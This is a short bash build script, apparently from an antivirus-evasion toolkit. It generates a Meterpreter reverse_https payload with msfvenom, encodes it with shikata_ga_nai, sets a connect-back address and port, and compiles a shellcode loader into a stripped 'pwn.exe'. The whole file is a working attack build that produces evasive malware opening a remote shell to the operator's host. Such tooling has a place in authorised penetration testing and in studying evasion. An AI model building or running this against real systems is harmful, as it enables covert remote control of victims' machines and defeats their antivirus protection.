#!/bin/bash          
# build the .exe file that loads the payload from a given text file

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > thepayload.bin

# call make_avet, the -l stands for loading and exec shellcode from given file 
./make_avet -l 

# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
strip pwn.exe

# cleanup
echo "" > defs.h

# call your programm with pwn.exe thepayload.bin
